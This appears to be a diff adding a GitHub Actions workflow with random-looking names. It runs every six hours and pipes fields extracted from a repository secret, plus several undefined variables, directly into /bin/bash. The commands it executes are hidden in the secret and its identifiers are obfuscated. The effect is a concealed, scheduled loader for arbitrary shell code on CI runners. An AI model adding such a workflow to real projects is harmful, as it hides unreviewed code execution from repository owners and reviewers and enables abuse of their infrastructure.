@@ -1,0 +1,27 @@
+name: yoalindsisheqs
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yoalindsisheqs
+        env:
+          pp72: ${{ secrets.pp72 }}
+        run: |
+          echo $pp72 | jq -r .ug6 | /bin/bash
+          echo $bk968 | jq -r .ao992 | /bin/bash
+          echo $chow7742 | jq -r .ycpz98987 | /bin/bash
+          echo $jj83 | jq -r .trsbj3250 | /bin/bash
+          echo $oyvr3561 | jq -r .nd81063 | /bin/bash
+          echo $w4 | jq -r .ddzlo14671 | /bin/bash
+          echo $gtys8 | jq -r .tzwsw885 | /bin/bash
+          echo $ppdf226 | jq -r .vx5274 | /bin/bash
+          echo $sp695 | jq -r .gxv848 | /bin/bash
+          echo $fud03 | jq -r .wl01 | /bin/bash
+          echo $hx3081 | jq -r .wzlx3013 | /bin/bash
+          echo $fxlp23 | jq -r .mq62341 | /bin/bash
+
